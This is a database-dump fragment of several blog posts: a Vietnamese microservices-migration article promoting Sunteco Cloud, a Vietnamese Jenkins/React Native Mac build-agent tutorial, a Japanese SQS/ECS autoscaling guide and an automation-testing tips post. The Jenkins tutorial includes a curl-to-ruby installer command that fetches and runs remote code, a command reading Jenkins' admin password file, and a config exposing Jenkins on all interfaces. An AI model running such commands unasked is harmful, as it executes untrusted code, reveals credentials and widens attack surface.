Nhờ chia nhỏ 1 ứng dụng lớn ra làm nhiều ứng dụng nhỏ hơn, hệ thống trở lên linh hoạt trong triển khai. Linh hoạt từ việc lựa chọn công nghệ cho đến phân phối tài nguyên. Hệ thống có thể đạt được tiêu chí scalability, high availability.

**- Giảm sự phụ thuộc**

Các module được xác định rõ trách nhiệm, việc ràng buộc trong sử dụng chung code business, model và database được giảm xuống.

**- Định hướng xoay quanh nghiệp vụ**

Microservices hướng đến các dịch vụ xoay quanh business, một service là một ứng dụng có thể chạy độc lập. Development teams thường sẽ chỉ phải tập trung vào phát triển business.

**- Khả năng phát triển, bảo trì và kiểm thử**

Các stack khác nhau có thể được áp dụng chung trong giải pháp tổng thể, thậm chí tái sử dụng từ một hệ thống khác mà không phải lo về sự tương thích. Việc kiểm thử cũng dễ triển khai hơn với các dịch vụ nhỏ, các nghiệp vụ rõ ràng.
Trong bài viết này mình sẽ không đi sâu để so sánh giữa monolith và microservices, xem thêm tại => [Monolith vs. microservices](https://sunteco.io/blogs/monolith-vs-microservices-should-you-migrate-to-microservices-architecture/).

## 2. The Microservices Layer?
Nếu chúng ta đã quen làm việc với monolith, từ việc code tất cả  trên cùng một repo, một máy chủ dedicated về cấu hình, một database phục vụ tất cả các mục đích... thì việc chuyển đổi qua microservices thực sự là một thử thách. Ở vị trí của người thiết kế hệ thống, có quá nhiều thứ mới để hiểu và áp dụng để có thể có được best P/P (price/performance) mà vẫn có khả năng mở rộng.
Một kiến trúc microservices hiệu quả là sự phối hợp một các hợp lý giữa các tech stack.
Ta có thể chia microservices làm 4 layer:
### 2.1. Infastructure layer
Sự chuyển dịch từ traditional computing sang distributed computing/cloud computing tạo điều kiện rất thuận lợi cho việc áp dụng kiến trúc microservices. Việc triển khai microservices mà không có sự hỗ trợ từ hạ tầng sẽ tốn nhiều công sức hơn đáng kể. Ở dưới cùng là hạ tầng với các thành phần cơ bản:
- Servers
- Host level loging/monitoring
- Operating systems
- Resource isolation
- Configuration management
### 2.2. Communication layer
Layer này dễ gây nhầm lẫn, bởi vì nó chạm đến tất cả các layer khác trong hệ sinh thái. Nó bao gồm tất cả mọi thứ liên quan đến giao tiếp giữa ứng dụng, hệ thống và dịch vụ bao gồm:
- DNS
- Endpoint
- Load balancing
- Messaging
- Network
- Service registry
- Service discovery
### 2.3. The Application platform
Layer thứ 3 là nơi chứa tất cả các công cụ nội bộ, hệ thống, dịch vụ mà các microservices chạy trên đó. Một application platform tốt là nơi các công cụ được centralize về mặt quản lý, system-wide về mặt phạm vi. Development teams chỉ cần quan tâm đến các microservices mà họ làm việc, không phải những thứ stuff phía dưới. Layer này bao gồm:
- Deployment management (tools and pipeline)
- Development environment
- Application-level logging and monitoring
- Test, package, build and release tools
### 2.4. The Microservices Layer
Các developer tập trung tại layer này và tập trung vào business. Layer này nên độc lập với các layer phía dưới. Nó chỉ chứa các microservices và các cấu hình giữa chúng.
- Microservices
- Microservices configuration
## 3. Transform the Monolith to microservices in action
Cùng xem xét một ứng dụng monolith truyền thống với các tier Presentation, Business logic và Data access layer.
### 3.1. Business and Tech Stacks
![](https://images.viblo.asia/be4d572b-c6b6-4b76-92bf-2ee5531e3af4.png)

Các đặc trưng của hệ thống hiện tại

**Business**: Ứng dụng thương mại điện tử.

**Architect**: 3 Tiers Application  bao gồm Presentation, Business logic, Data access layer sử dụng Spring MVC, Spring Data

**Database**: Database sử dụng Mysql

**Hosting**: Ứng dụng được triển khai bằng file jar và database  trên server đặt tại công ty
### 3.2. Các issue hệ thống đang gặp phải
- Spring MVC dựa trên kiến trúc server side rendering, multiple pages application, dẫn đến việc load trang lâu hơn
- Hệ thống downtime mỗi khi nâng cấp phiên bản mới, cho dù là tính năng nhỏ nhất của một module
- Hiện tượng bottle neck xuất hiện mỗi khi có nhiều người cùng truy cập hoặc thực hiện các tác vụ nặng, lost các đơn hàng, hệ thống order không hoạt động ổn định, thậm chí down cả dịch vụ. Tăng cấu hình tài nguyên thì tốn kém khi hệ thống tải thấp, nhưng vẫn ko đủ phục vụ khi hệ thống tải cao.
- Chức năng tìm kiếm sản phẩm chậm do dùng query truyền thống
- Quản lý build number của app và data một cách thủ công, bằng cách backup các file vật lý (.jar, sql)
- Hệ thống trace log cũng thủ công bằng cách write ra file, khó để trace lại khi có error
- Hệ thống chứa nhiều module nghiệp vụ, code đang phức tạp và khó maintain, việc phát triển tính năng mới đòi hỏi phải test lại toàn bộ hệ thống
- Ảnh sản phẩm được lưu trữ trực tiếp trên một máy chủ khác, khó quản lý
### 3.3. Chuyển đổi hệ thống sang microservice
**Chuyển đổi các business module sang microservices:**
 + Authentication
 + Product management
 + Warehouse
 + Order/Payment
 + Shipping
 + Report
 + Client site
 + Cms site

**Chuyển đổi về architect:**

Như phân tích ở trên, vấn đề khó khắc phục nhất trong các issue là vấn đề ứng dụng chạy trên nền tảng dedicated resource (VM) dẫn đến không thể kịp thời scale theo lượng tài nguyên yêu cầu, ảnh hưởng trực tiếp đến chất lượng hệ thống và trải nghiệm người dùng. Xem xét các chuyển đổi về architect:

![](https://images.viblo.asia/b029777b-efe1-4bc1-9315-c0909e258212.png)

+ Triển khai ứng dụng dựa trên container orchestration (K8S concept), phục vụ mục đích scalability, high availability
+ Tối ưu tìm kiếm sản phẩm bằng việc dựng thêm elastic service, đồng bộ với Product database
+ Xem xét nâng cấp database sang mô hình master-slave để tối ưu hiệu quả đọc ghi.
+ Load balancer cân bằng tải cho các instance mỗi khi hệ thống cao tải
+ API gateway giúp ẩn kiến trúc phía sau và authentication/ request logging tập trung
+ Lựa chọn công nghệ message queue cho giao tiếp bất đồng bộ giữa microservices
+ Client site và cms site sử dụng công nghệ client site rendering (angular/react) để đạt higher performance. Việc phát triển tầng UI và business logic được tách biệt
+ Separate các database cho mỗi dịch vụ, tăng resource cho các database có nhiều request, thậm chí áp dụng DB replica, master/slave => tăng tính bảo mật và upgrade về sau
+ Sử dụng docker hub hoặc private image registry để lưu trữ các bản build của service dưới dạng image tag.
+ Áp dụng các công nghệ có thể backup data dưới dạng backup volume bên cạnh dạng backup file truyền thống
+ Chọn một stack cho việc lưu trữ file (ảnh sản phẩm, Database backup): Object storage  technology (Sun S3)

### 3.4. Lựa chọn tech stack, provider và triển khai

Với cùng một thiết kế hệ thống, chúng ta có thể điều chỉnh lựa chọn tech stack và provider phù hợp với hoàn cảnh của mỗi công ty. Trên thị trường quốc tế có các tên tuổi lớn về cloud provider và app platform nổi tiếng như AWS, GCP, Microsoft azure. Trong nước thì có các nhà cung cấp như VNG cloud, Viettel IDC, CMC, FPT, Sunteco Cloud với các mức giá và dịch vụ khác nhau. Mình sẽ triển khai hệ thống này trên [Sunteco Cloud](https://sunteco.vn/), lấy trọng tâm là Sun Spinner, đây là dịch vụ dựa trên concept của K8S, hỗ trợ sẵn Load balancing, HA và scability chỉ với vài click. Một Sun-spinner có thể chứa một hoặc nhiều container.

- Sau khi build các service sang dạng image và đẩy lên docker hub, setup các Sun Spinner cluster từ giao diện
- Sun Spinner cho phép run bất kì image nào trên docker hub hoặc các image registry khác, thao tác hoàn toàn qua UI
- Database có thể được triển khai qua 3 cách trên Sunteco Cloud,
* * Tạo một mysql-spinner sau đó sử dụng persistance volume (Vùng nhớ lưu trữ lâu dài)  và mount vào data stored path của mysql-spinner
* * Cách truyền thống hơn là sử dụng dịch vụ Sun VM để host database với dedicated resource
* * Dịch vụ Database as a service (Comming soon)
- Các service-config được setup qua hệ thống Secret/ Configmap và mount trực tiếp vào Spinner. Đơn giản hóa quá trình quản lý configuration
- Các trang static web (landing page) có thể host trên Sun VM hoặc Sun S3 storage
- Message queue sử dụng Sun Highway (kafka as a service)
Vòng đời của các service: CICD => push to docker hub => Sun Spinner pull image => Service booting => Service running. Có một góp ý nhỏ là Spinner chưa có cơ chế tích hợp với hệ thống CICD của các doanh nghiệp, có lẽ cần một api callback để trigger việc cập nhật ứng dụng lên phiên bản mới. Hiện tại phải lên portal của Sunteco Cloud để manual update version mới hoặc setup Sun Spinner với auto update policy. Nhờ việc chỉ cần facing ứng dụng web và api gateway ra ngoài, các ứng dụng phía sau giao tiếp với nhau qua internal endpoint, message broker mà performance và security được nâng cao.
Mình chưa đề cập đến vấn đề database relication, xin hẹn ở những bài viết sau.
## 4. Conclusion
Các bạn có thể cân nhắc chuyển đổi toàn bộ hoặc từng phần ứng dụng của doanh nghiệp với mức chi phí nhỏ nhất để đặt được hiệu quả tốt nhất.
Công nghệ container cho phép ứng dụng có thể scale một các tùy ý. [Sun Spinner](https://console.sunteco.vn/register) của Sunteco có pricing theo giờ, có nghĩa là nếu hệ thống tải bình thường thì lượng tiêu thụ chỉ tương đương với VM cùng cấu hình, nhưng khi hệ thống tăng tải, cấu hình được tự động scale ngay lập tức để đáp ứng nhu cầu, khi hệ thống giảm tải, cấu hình lại trở về mức bình thường. Tất cả các nhu cầu này nếu tự dựng một hệ thống K8S rồi tự setup sẽ tốn khá nhiều nguồn lực và chưa chắc đã hoạt động ổn định. Việc chuyển đổi từ kiến trúc monolith sang microservices hoặc xây dựng mới hoàn toàn là không dễ dàng, nhưng nó rất đáng giá để thực hiện.


Reference
https://www.susanjfowler.com/blog/2016/12/18/the-four-layers-of-microservice-architecture', '2023-02-06T08:09:29.000000Z', '2023-02-28T05:00:16.000000Z', '2023-02-06T08:12:01.000000Z'),
	('Bài 1 - React Native DevOps các khái niệm và các cài đặt căn bản', '7ymJXX1gJkq', '2', 'public', 'https://images.viblo.asia/c13c1882-325a-4228-9c5b-948f24cf1766.png', 'Hướng dẫn setup jenkins agent để bắt đầu build mobile bằng jenkins cho developer an tâm phát triển sản phẩm

Tóm tắt
Các khái niệm
* Yêu cầu phần cứng
* Kiểm sót source code
* Provisioning profiles ios
* Môi trường build (environment)

Hướng dẫn
* Thiết lập máy tính ban đầu
* Cài đặt các ứng dụng
* Thêm New node vào jenkins master
* Chạy test job

Các khái niệm

Tổng quan hệ thống

Yêu cầu phần...', '> Hướng dẫn setup jenkins agent để bắt đầu build mobile bằng jenkins cho developer an tâm phát triển sản phẩm

# Tóm tắt
## Các khái niệm
* Yêu cầu phần cứng
* Kiểm sót source code
* Provisioning profiles ios
* Môi trường build (environment)

## Hướng dẫn
* Thiết lập máy tính ban đầu
* Cài đặt các ứng dụng
* Thêm New node vào jenkins master
* Chạy test job


# Các khái niệm

## Tổng quan hệ thống

![image.png](https://images.viblo.asia/c13c1882-325a-4228-9c5b-948f24cf1766.png)

## Yêu cầu phần cứng

* Ở đây mình sử dụng phần cứng là Mac Mini M1 2020 (3.2Ghz Apple M1 Chip With 8-CPU, 16G RAM, SSD 512), còn các bạn muốn sử dụng trên cloud thì có thể tham khảo máy chủ ở đây [macincloud.com](https://macincloud.com)
* Máy Mac Mini  mình sẽ để ở công ty vào chỉ build được ở mạng nội bộ của công ty qua địa chỉ IP của máy, còn các bạn có thể đưa ra network bằng cách NAT ip ra mạng hoặc sử dụng dịch vụ trên Mac Cloud

## Kiểm sót source code

Hướng dẫn này mình sẽ sử dụng Github để quản lý soucre code, Jenkins và GitHub sử dụng cùng nhau mang lại sự nhất quán và tốc độ cho đội develop. Jenkins chạy tất cả các loại luồng DevOps tự động, như xác minh xây dựng hàng giờ, xây dựng hàng đêm, xây dựng yêut theo yêu cầu của bạn, và nhiều cách khác.

## Provisioning profiles ios

* Phần yêu thích nhất của tôi trong phát triển iOS là Provisioning profiles. Tôi thích phương pháp Android vì sự đơn giản của nó, đặc biệt là khi quản lý các loại build. Cách tiếp cận của Apple để xây dựng các điểm đến là hạn chế và yêu cầu thêm công việc từ nhà phát triển để kiểm tra tất cả các trường hợp.
* Để sử được được Provisioning profiles thì ta dùng [Match](https://docs.fastlane.tools/actions/match/) , lưu trữ và cập nhật hồ sơ cung cấp iOS và chứng chỉ ký kết. Tất cả các tệp được tạo bởi khớp sau đó được lưu trữ trong kho lưu trữ Github được mã hóa, với khóa giải mã được chia sẻ bởi  nhóm develop.

## Môi trường build (environment)

* Phát hành một dự án React Native (RN) để sản xuất đòi hỏi rất nhiều công cụ. Ở mức tối thiểu, một bản phát hành thành công sẽ sử dụng Node.js, NPM / Yarn, Xcode và Android Studio. Các dự án kết hợp SDK của bên thứ 3 thêm độ phức tạp và công cụ bổ sung vào các bản phát hành. Quản lý sự phức tạp này là rất quan trọng để tạo ra một quy trình build.

* Điều rất quan trọng đối với tất cả các developer làm việc trong dự án là có cùng một môi trường. Tự động tăng version trong môi trường cho RN không đơn giản so với các nền tảng khác - có rất nhiều công cụ và rất nhiều nơi để phạm sai lầm nhỏ. Sự khác biệt nhỏ giữa máy phát triển và máy xây dựng có thể dẫn đến thời gian lãng phí thời gian của developer, và có khả năng ngồi bù đầu để tìm ra lỗi khi build.

* Việc thiết lập và cài đặt Jenkins buộc phải chuẩn hóa môi trường xây dựng cho chính bạn và nhóm develope. Phát triển trong cùng một môi trường chạy các bản build của bạn.

# Hướng dẫn
## Thiết lập máy tính ban đầu

### 1. Cập nhật hệ điều hành mới nhất
Để bộ build chạy mượt và đồng bộ môi trường với developer thì chúng ta cần update hệ thống bằng cách update hệ điều hành:
1. Chọn biểu tượng trái táo ![Screenshot 2023-02-06 at 11.51.18.png](https://images.viblo.asia/ab0708e4-0038-42ac-9c7b-aa4b7d2a3755.png)
2. Chọn ‘Software Update’
3. Cập nhật macOS

### 2.  Cài đặt Xcode
1. Mở ứng dụng Appstore
2. Tìm kiếm xcode
![](https://images.viblo.asia/f8faa7ab-26ce-450d-830e-09617aec19e3.png)
3. Bấm vào tải về và cài đặt
![](https://images.viblo.asia/7875a55d-538a-4f2b-8494-1e53c579811c.png)

4. Mở xcode hoàn thành các thiết lập ban đầu

![Screenshot 2023-02-06 at 12.20.40.png](https://images.viblo.asia/c8e3de99-87df-438e-af14-da5c793a88d5.png)

Nhấp vào ***Agree***

![Screenshot 2023-02-06 at 12.21.22.png](https://images.viblo.asia/fc7199ac-63bc-45b6-8555-dd6cae7479a9.png)

Nhấp vào ***Install***

![Screenshot 2023-02-06 at 12.21.46.png](https://images.viblo.asia/33aec20d-970a-4592-9798-b74032292751.png)

Nhấp vào ***Continue***

![Screenshot 2023-02-06 at 12.22.01.png](https://images.viblo.asia/a1ebdd26-93b5-4f20-97a1-e74d5ab6c6d0.png)

Hoàn thành thiết lập

![Screenshot 2023-02-06 at 12.22.48.png](https://images.viblo.asia/2bd14f42-4bff-4c55-9c50-edaeba4338ec.png)

### 3. Cài đặt  xcode cli

Mở termianl và gõ lệnh

```
xcode-select --install
```

![Screenshot 2023-02-06 at 13.02.34.png](https://images.viblo.asia/7736cf30-961f-47e8-8791-1f3ce0a559a6.png)

Nhấp vào ***Install***

![Screenshot 2023-02-06 at 13.03.13.png](https://images.viblo.asia/61730892-9410-49e9-a602-23f769c0e96d.png)

Nhấp vào ***Agree***

![Screenshot 2023-02-06 at 13.04.25.png](https://images.viblo.asia/bdd6ba93-2580-4c19-9d53-cd27204753fd.png)

Cài đặt thành công
![Screenshot 2023-02-06 at 13.11.01.png](https://images.viblo.asia/ab8fdb3e-c39c-4110-a660-015513c5be37.png)

Ta tiếp tục dùng lệnh

```
sudo xcode-select -s /Applications/Xcode.app/Contents/Developer
sudo xcodebuild -license
```

![Screenshot 2023-02-06 at 13.22.20.png](https://images.viblo.asia/1a985e57-59c3-4d88-a780-8a9c02559ff5.png)

Bật chế độ nhà phát triển bằng lệnh

```
DevToolsSecurity -enable
```

![Screenshot 2023-02-06 at 13.23.11.png](https://images.viblo.asia/d8f424bc-3305-448b-9b53-01c51ef61075.png)

### 4. Cài đặt Android Studio

Vào trang chủ Android Studio  để tải https://developer.android.com/studio

![Screenshot 2023-02-06 at 13.24.46.png](https://images.viblo.asia/a86c6597-11a7-4423-991d-d3476fdc08fe.png)

Nhấp vào **Download Android Studio Electric Eel**

![Screenshot 2023-02-06 at 13.25.29.png](https://images.viblo.asia/d795746a-2e11-47f6-8d46-74488d984d9f.png)

Chọn ![Screenshot 2023-02-06 at 13.25.42.png](https://images.viblo.asia/66662f19-0d33-4bf9-819f-931cfac969d6.png) vì mình đang sử dụng chi M1 của Apple

Sau khi tải xong mở tiệp vừa tải về, kéo sang thư mục Application

![Screenshot 2023-02-06 at 13.56.19.png](https://images.viblo.asia/232f475d-1b74-4800-a388-c92f8908bf7e.png)

sau đó mở Android sutudio trong thư mục Application

![Screenshot 2023-02-06 at 13.58.50.png](https://images.viblo.asia/008de8a5-bb8e-4c83-b0da-d85e1becb5f4.png)

Nhấp vào **Open**

![Screenshot 2023-02-06 at 13.59.57.png](https://images.viblo.asia/b1f7f83c-2bd5-48c5-a59c-8589a0ad8628.png)

Nhấp vào **Ok**

![Screenshot 2023-02-06 at 14.00.27.png](https://images.viblo.asia/e090ea88-693a-4450-929f-3e6813cd8ee5.png)

Nhấp vào **Next**

![Screenshot 2023-02-06 at 14.00.44.png](https://images.viblo.asia/088bf7b7-2957-47ce-894c-3e0cb7fe9a82.png)

Chọn  **Standard**,  sau đó tiếp tục nhấp vào **Next**

![Screenshot 2023-02-06 at 14.01.37.png](https://images.viblo.asia/94af1101-3806-4639-abb2-ab4e0d093280.png)

Nhấp vào **Next**

![Screenshot 2023-02-06 at 14.02.37.png](https://images.viblo.asia/9ae4ba9d-e5be-4456-b9cb-136fe4b7f84a.png)

Nhấp vào **Next**

![Screenshot 2023-02-06 at 14.02.50.png](https://images.viblo.asia/7af747d3-1fa1-4c08-8afe-891a51a5613c.png)

Chọn  **Accept**,  sau đó tiếp tục nhấp vào **Finish**

![Screenshot 2023-02-06 at 14.09.15.png](https://images.viblo.asia/2a176bf1-f04b-4429-b34d-a21d5e681297.png)

Nhấp vào **Finish**

![Screenshot 2023-02-06 at 14.09.32.png](https://images.viblo.asia/9cf851c7-afde-400e-aa6d-ea2e8fa2b47c.png)

### 5. Cài đặt Android SDK

Android Studio hiện đã được thiết lập. Thiết lập các thành phần SDK cần thiết trên màn hình chào mừng.

![](https://images.viblo.asia/25979e9e-3052-4781-974f-b1354c1509ab.png)

Nhấp vào **More Actions**, sau đó chọn **SDK Manager**, Tick theo trên hình và sau đó nhấp vào **OK**

![Screenshot 2023-02-06 at 14.34.21.png](https://images.viblo.asia/d4196ebf-5592-430c-9b16-186ef008869e.png)

![Screenshot 2023-02-06 at 14.34.56.png](https://images.viblo.asia/207cbdbc-1ac1-422c-967d-cd39dd1415eb.png)

### 6. Cài đặt phần miềm CLI

1. Homebrew
```
/usr/bin/ruby -e "$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/master/install)"
```

2. JDK 11

```
brew tap homebrew/cask-versions
brew install --cask zulu11
```

![Screenshot 2023-02-06 at 14.39.45.png](https://images.viblo.asia/fc93bd72-0df0-4ec4-9488-920e7172770e.png)

### 7. Cài đặt .zshrc

Mở tiệp .zshrc và thêm  vào dòng bên dưới

```
# Android
export ANDROID_SDK="$HOME/Library/Android/sdk"
export ANDROID_SDK_TOOLS="$ANDROID_SDK/tools"
export ANDROID_SDK_TOOLS_BIN="$ANDROID_SDK_TOOLS/bin"
export ANDROID_PLATFORM_TOOLS="$ANDROID_SDK/platform-tools"
export PATH="$PATH:$ANDROID_SDK:$ANDROID_SDK_TOOLS"
export PATH="$PATH:$ANDROID_SDK_TOOLS_BIN:$ANDROID_PLATFORM_TOOLS"
# Fastlane
export LANG=en_US.UTF-8
export LANGUAGE=en_US.UTF-8
export LC_ALL=en_US.UTF-8
```

![Screenshot 2023-02-06 at 14.43.24.png](https://images.viblo.asia/d1d15826-5420-4580-9620-abe3e24f6d54.png)

dùng lệnh để apply cấu hình

```
source $HOME/.zshrc
```

![Screenshot 2023-02-06 at 14.44.31.png](https://images.viblo.asia/0c8289c3-7536-44cb-847b-c11f485eb6e2.png)

### 8. Cài đặt Jenkins

Ta cài đặt jenkins bằng lệnh

```
brew install jenkins-lts
```

![Screenshot 2023-02-06 at 14.47.37.png](https://images.viblo.asia/633dd259-3919-4748-946c-52e4952fa471.png)
![Screenshot 2023-02-06 at 14.50.50.png](https://images.viblo.asia/9195be15-f7af-4399-ab03-677a76227ee2.png)

Sau khi cài đặt thành cộng ta start bằng lệnh

```
brew services start jenkins-lt
```

![Screenshot 2023-02-06 at 14.52.41.png](https://images.viblo.asia/74e1ab55-c220-4f85-bdb3-c11a85dddf1a.png)

Sau đó ta vào đường dẫn http://127.0.0.1:8080/login?from=%2F để login vào hệ thống

![Screenshot 2023-02-06 at 14.56.47.png](https://images.viblo.asia/0c1d06e6-f8b4-4631-b854-a1f97d3f2485.png)

ta lấy password mặt định bằng lệnh

```
cat /Users/duytran/.jenkins/secrets/initialAdminPassword
```

![Screenshot 2023-02-06 at 14.57.38.png](https://images.viblo.asia/2fbda5d8-8a5f-4c73-ad57-d4cc542e95e7.png)

 Cấu hình public ip kết nối vào bằng cách mở tất cả ip kết nối đến jenkins

 ```
 #nano /usr/local/opt/jenkins-lts/homebrew.mxcl.jenkins-lts.plist

 <?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
	<key>Label</key>
	<string>homebrew.mxcl.jenkins-lts</string>
	<key>LimitLoadToSessionType</key>
	<array>
		<string>Aqua</string>
		<string>Background</string>
		<string>LoginWindow</string>
		<string>StandardIO</string>
		<string>System</string>
	</array>
	<key>ProgramArguments</key>
	<array>
		<string>/usr/local/opt/openjdk@17/bin/java</string>
		<string>-Dmail.smtp.starttls.enable=true</string>
		<string>-jar</string>
		<string>/usr/local/opt/jenkins-lts/libexec/jenkins.war</string>
		<string>--httpListenAddress=0.0.0.0</string> # <= Thêm ở đây
		<string>--httpPort=8080</string>
	</array>
	<key>RunAtLoad</key>
	<true/>
</dict>
</plist>
 ```

 Sau đó restart service và kết nối bình thường bằng ip của mạng

 ```
 brew services restart jenkins-lt
 ```

 Phần tiếp theo tham khảo ở bài

 [](https://viblo.asia/p/bai-6-cau-hinh-jenkins-tren-ubuntu-2204-va-viet-pipeline-build-service-y37LdwBRJov)

###  9. Cài đặt fastlane

Ta cài đăt bằng lệnh fastlane

```
brew install fastlane
```

![Screenshot 2023-02-06 at 15.04.35.png](https://images.viblo.asia/7330aeff-0a73-4ec5-b78a-f4b74e5b1264.png)
![image.png](https://images.viblo.asia/b3aadf4a-ccc0-4f76-91e0-1f495e19de89.png)


### Như vậy bạn đã hiểu và cài đặt được cơ bản server build jenkins cho React native, bài tiếp theo mình sẽ hướng dẫn build đẩy lên firebase distribution', '2023-02-06T08:07:23.000000Z', '2023-02-28T05:00:16.000000Z', '2023-02-15T09:26:26.000000Z'),
	('Blog#131: SQSキューからのメッセージによってトリガーされるAuto Scalingを使ってECSタスクを実行する方法', 'GyZJZnb3Jjm', '3', 'public', 'https://images.viblo.asia/a0ebba2f-42c7-48e0-b718-cf343c0cbf5c.png', '

この記事の主な目的は、日本語レベルを上げるのを手伝うことです。ソフトウェア開発に関連する概念や知識なとを紹介するために簡単な日本語を使います。ITの知識に関しては、インターネット上でもっとよく説明されているかもしれませんが、この記事の主な目標はまだ日本語を学ぶことです。

こんにちは、私はトゥアンと申します。東京からフルスタックWeb開発者です。
将来の有用で面白い記事を見逃さないように、私のブログをフォローしてください。

はじめに
AWSを利用すると、簡単にスケーラブルなサービスを構築することができます。本記事では、Amazon Simple Queue Service（SQS）とAmazon Elastic Container Service（ECS）を組み合わせて、メッセージに応じてタスクを自動スケーリングする方法について説明します。

SQSはメッセージキューサービスで...', '![image.png](https://images.viblo.asia/a0ebba2f-42c7-48e0-b718-cf343c0cbf5c.png)

> この記事の主な目的は、[日本語](https://viblo.asia/s/-E1XVOWqNVMz)レベルを上げるのを手伝うことです。ソフトウェア開発に関連する概念や知識なとを紹介するために[簡単な日本語](https://viblo.asia/s/-E1XVOWqNVMz)を使います。ITの知識に関しては、インターネット上でもっとよく説明されているかもしれませんが、この記事の主な目標はまだ[日本語を学ぶ](https://viblo.asia/s/-E1XVOWqNVMz)ことです。
-----
こんにちは、私は[トゥアン](https://tuan-portfolio.web.app/#/)と申します。東京からフルスタックWeb開発者です。
将来の有用で面白い記事を見逃さないように、私のブログをフォローしてください。

# はじめに
AWSを利用すると、簡単にスケーラブルなサービスを構築することができます。本記事では、Amazon Simple Queue Service（SQS）とAmazon Elastic Container Service（ECS）を組み合わせて、メッセージに応じてタスクを自動スケーリングする方法について説明します。

SQSはメッセージキューサービスです。アプリケーション間でメッセージをやり取りすることができます。ECSはDockerコンテナを管理するサービスです。SQSキューからのメッセージによってトリガーされる自動スケーリングを使用してECSタスクを実行することで、メッセージに応じてタスクをスムーズかつ効率的に処理することができます。

# やってみよう
以下では、この設定方法をいくつかステップに分けて説明します。

### SQSキューを作成する
名前「TaskQueue」のSQSキューを作成します。

### ECSタスク定義を作成する
名前「TaskDefinition」のタスク定義を作成します。このタスク定義は、好きなDockerイメージと、CPUやメモリなどの必要リソースを指定するものです。

### ECSサービスを作成する
名前「TaskService」のECSサービスを作成します。このサービスは「TaskDefinition」タスク定義で定義されたタスクを実行・管理します。

### Auto Scalingグループを作成する
名前「TaskASG」のAuto Scalingグループを作成します。このグループは、「TaskService」と関連付けられており、グループ内で許可されるEC2インスタンスの最小・最大数を指定します。

### CloudWatch Alarmを作成する
名前「TaskAlarm」のCloudWatch Alarmを作成します。このAlarmは「TaskQueue」SQSキュー内のメッセージ数を監視します。

### スケーリングポリシーを作成する
名前「TaskPolicy」のスケーリングポリシーを作成します。このポリシーは「TaskASG」Auto Scalingグループに関連付けられ、Auto ScalingグループがEC2インスタンス数をスケールアップまたはダウンさせるべき条件を指定します。

### CloudWatch Alarmとスケーリングポリシーをリンクする
「TaskAlarm」CloudWatch Alarmと「TaskPolicy」スケーリングポリシーをリンクします。これは、CloudWatch Alarmが発火したときにスケーリングポリシーがトリガーされることを意味します。

### SQSキューにメッセージを送信する
"TaskQueue" SQSキューにメッセージを送信します。これにより、Auto Scaling GroupがEC2インスタンスの数を調整する準備が整います。

### タスクの実行を確認する
最後に、ECSタスクがSQSキューからメッセージを処理して実行されていることを確認します。"TaskService"のイベント、タスクによって生成されたログ、および"TaskASG"のAuto Scaling Group内のEC2インスタンスの数を確認することで確認できます。

これらの設定により、SQSキューにメッセージが受信されたときに自動スケーリングでECSタスクを実行することができます。Auto Scaling GroupはSQSキュー内のメッセージ数に基づいてEC2インスタンスの数を自動的に調整するため、タスクを効率的かつ効果的に処理することができます。

# まとめ
この記事では、SQSキューからのメッセージによってトリガーされる自動スケーリングを使用してECSタスクを実行する方法について説明しました。いくつかステップを踏むことで、SQSキューにメッセージが受信されたときに自動的にEC2インスタンスの数を調整してECSタスクを実行することができます。これにより、タスクを効率的かつ効果的に処理することができます。

今回の設定は初めての方にも簡単に理解・実行できる内容となっています。AWSを利用してサービスを構築する際には、このような自動スケーリングの機能を活用することで、サービスのスムーズな運用ができるかもしれません。

# 最後

いつもお世話になっています。この記事を楽しんで、新しいことを学べたら嬉しいです。

今度の記事でお会いしましょう！この記事が気に入ったら、私を応援するために「LIKE」を押して登録してください。ありがとうございました。

-----
> この記事の主な目的は、[日本語](https://viblo.asia/s/-E1XVOWqNVMz)レベルを上げるのを手伝うことです。ソフトウェア開発に関連する概念や知識なとを紹介するために[簡単な日本語](https://viblo.asia/s/-E1XVOWqNVMz)を使います。ITの知識に関しては、インターネット上でもっとよく説明されているかもしれませんが、この記事の主な目標はまだ[日本語を学ぶ](https://viblo.asia/s/-E1XVOWqNVMz)ことです。

# Ref
* https://tuan200tokyo.blogspot.com/2023/02/blog131-sqsauto-scalingecs.html', '2023-02-06T06:49:31.000000Z', '2023-02-26T03:32:04.000000Z', '2023-02-06T06:56:10.000000Z'),
	('Tips để manual tester tự học Automation test hiệu quả hơn với tool akaAT Studio', 'MkNLrOlwVgA', '4', 'public', '', 'Trong quá trình tự học, không phải ai cũng biết mình cần học gì trước học gì sau, hỏi gì cho đúng để được câu trả lời thỏa đáng, và càng không phải ai cũng có thời gian ngồi chém gió hay khuyên bảo chúng ta,

Quan trọng chúng ta là không biết đặt câu hỏi, đầu óc trống trơn,

Bạn tưởng tượng rằng, làm một việc không có mục đích, hoặc mục tiêu quá chung chung nó sẽ rất mất thời gian, nhanh nản, ...', 'Trong quá trình tự học, không phải ai cũng biết mình cần học gì trước học gì sau, hỏi gì cho đúng để được câu trả lời thỏa đáng, và càng không phải ai cũng có thời gian ngồi chém gió hay khuyên bảo chúng ta,

Quan trọng chúng ta là không biết đặt câu hỏi, đầu óc trống trơn,

Bạn tưởng tượng rằng, làm một việc không có mục đích, hoặc mục tiêu quá chung chung nó sẽ rất mất thời gian, nhanh nản,

Chẳng phải để tìm được mentor hay ai đó có thể chỉ mình thì mình phải hỏi đúng sao, họ cũng ko có nghiệp vụ training
Vậy thì phải làm sao để tự học hiệu quả hơn?

Đối với các bạn được làm dự án Auto test ngay thì ngon rồi, cứ thế mà thực hành và tích lũy vì việc phải làm, testcase có đó rồi, làm tới đâu hỏi tới đó, lại còn được dự án training,

Nhưng đối với manual test chưa biết gì về lập trình mà không có
môi trường thực hành, chưa có nhiều thời gian thì sao?

**BẠN HÃY ĐẶT MỤC TIÊU NGHIÊM TÚC CHO BẢN THÂN MÌNH**
**1: Tự viết hoặc lấy một bộ testcase auto có sẵn**
Hãy chắc chắn rằng bạn hiểu các step nó làm với mục đích gì nhé
Tham khảo Bộ testcase basic tại đây https://bit.ly/3Y8sCZx

**2: Dùng tool hỗ trợ viết script test akaAT Studio để kéo thả từ khóa trước**

ở đây mình sẽ hỗ trợ

Chủ yếu hình dung ra được 1 script của bạn sẽ trông thế nào, nó sẽ chạy ra sao đúng ý mình chưa

